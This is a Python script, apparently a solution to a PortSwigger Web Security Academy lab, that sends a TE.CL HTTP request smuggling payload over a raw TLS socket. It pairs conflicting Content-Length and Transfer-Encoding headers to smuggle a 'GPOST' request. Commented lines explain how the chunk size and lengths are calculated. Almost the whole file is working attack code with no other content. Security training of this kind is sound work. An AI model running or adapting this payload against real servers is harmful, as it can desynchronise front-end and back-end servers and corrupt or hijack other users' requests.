import socket
import ssl

host = '0a8400990357b39681519323005800e6.web-security-academy.net'
port = 443

# Smuggling payload (TE.CL)
payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "56\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 5\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
)

# body = (
#     "GPOST / HTTP/1.1\r\n"
#     "Content-Type: application/x-www-form-urlencoded\r\n"
#     "Content-Length: 5\r\n"
# )
# print(hex(len(body))) #0x56 => line(15)
# Content-length: 5 => line(19-21)
# Content-length: 4 (line(12) = 4 byte length of "56\r\n")

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending payload ...")
send_raw_https(host, port, payload)